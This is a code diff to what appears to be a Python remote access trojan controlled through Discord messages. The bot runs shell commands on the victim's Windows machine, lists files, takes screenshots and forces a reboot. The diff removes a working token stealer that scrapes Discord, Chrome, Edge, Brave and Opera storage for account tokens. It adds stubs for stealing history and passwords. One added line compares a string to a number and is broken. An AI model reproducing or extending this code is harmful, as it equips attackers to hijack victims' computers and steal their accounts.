@@ -102,7 +102,7 @@ async def on_message(message):
         files = "\n".join(os.listdir())
         if files == "":
             files = "No files found"
-        if len(files) > 4095:
+        if len(files) > 4093:
             open(f"{os.getenv('TEMP')}\\list.txt", "w").write(files)
             embed = discord.Embed(title=f"Files > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
             file = discord.File(f"{os.getenv('TEMP')}\\list.txt")
@@ -135,6 +135,11 @@ async def on_message(message):
         ).communicate()[0].decode("utf-8")
         if output == "":
             output = "No output"
+        if output > 4093:
+            open(f"{os.getenv('TEMP')}\\output.txt", "w").write(output)
+            embed = discord.Embed(title=f"Shell > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
+            file = discord.File(f"{os.getenv('TEMP')}\\output.txt")
+            return await message.reply(embed=embed, file=file)
         embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
         await message.reply(embed=embed)
 
@@ -156,40 +161,6 @@ async def on_message(message):
         embed = discord.Embed(title="Screenshot", color=0xfafafa)
         embed.set_image(url="attachment://screenshot.png")
         await message.reply(embed=embed, file=file)
-
-    # Token grab not working on newest Discord client (will be fixed in next update)
-    if message.content == "tokens":
-        paths = [
-            os.path.join(os.getenv("APPDATA"), ".discord", "Local Storage", "leveldb"),
-            os.path.join(os.getenv("APPDATA"), ".discordcanary", "Local Storage", "leveldb"),
-            os.path.join(os.getenv("APPDATA"), ".discordptb", "Local Storage", "leveldb"),
-            os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
-            os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),
-            os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
-            os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
-            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
-            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
-            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera", "Local Storage", "leveldb"),
-        ]
-        tokens = []
-        for path in paths:
-            if not os.path.exists(path):
-                continue
-            
-            for file in os.listdir(path):
-                if not file.endswith(".log") and not file.endswith(".ldb"):
-                    continue
-
-                for line in [x.strip() for x in open(os.path.join(path, file), errors="ignore").readlines() if x.strip()]:
-                    for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"]:
-                        for token in re.findall(regex, line):
-                            tokens.append(token)
-                            
-        tokens = "\n".join(tokens)
-        if tokens == "":
-            tokens = "No tokens found"
-        embed = discord.Embed(title="Tokens", description=f"```{tokens}```", color=0xfafafa)
-        await message.reply(embed=embed)
             
     if message.content == "cwd":
         embed = discord.Embed(title="Current Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
@@ -204,6 +175,15 @@ async def on_message(message):
         embed = discord.Embed(title="Restart", description=f"```Restarting...```", color=0xfafafa)
         await message.reply(embed=embed)
         os.system("shutdown /r /t 0")
+        
+    if message.content == "tokens": 
+        await message.reply("Not implemented yet")
+                            
+    if message.content == "history":
+        await message.reply("Not implemented yet")
+        
+    if message.content == "passwords":
+        await message.reply("Not implemented yet")
 
 bot.run(token)
 
